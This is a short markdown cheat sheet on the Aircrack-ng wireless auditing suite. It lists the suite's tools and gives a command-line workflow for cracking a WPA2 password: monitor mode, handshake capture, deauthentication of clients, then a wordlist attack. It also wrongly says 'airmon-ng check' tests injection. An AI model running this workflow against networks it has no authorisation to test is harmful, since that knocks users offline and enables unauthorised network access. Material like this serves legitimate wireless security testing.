## 📡 Aircrack-ng Suite

The **Aircrack-ng** suite is one of the most powerful wireless network auditing tools.

### 🧩 Components

#### 📍 Monitoring

- **Airodump-ng** – Capture raw 802.11 frames and export to `.cap` files
- **Airmon-ng** – Enable monitor mode on a wireless card

#### 🧨 Attacking

- **Aireplay-ng** – Packet injection, de-authentication, fake AP, replay attacks

#### 🔍 Testing

- **airmon-ng check** – Tests WiFi adapter injection and compatibility

#### 🔓 Cracking

- **Aircrack-ng** – Crack WEP, WPA, WPA2-PSK passwords using captured handshake files

---

## 🔧 Example Workflow (WPA2 Crack - Aircrack-ng)

```bash
# 1. Enable monitor mode
sudo airmon-ng start wlan0

# 2. Capture handshake
sudo airodump-ng wlan0mon --bssid <target-BSSID> -c <channel> -w capture

# 3. Perform deauth to get handshake
sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon

# 4. Crack with wordlist
aircrack-ng -w wordlist.txt capture.cap
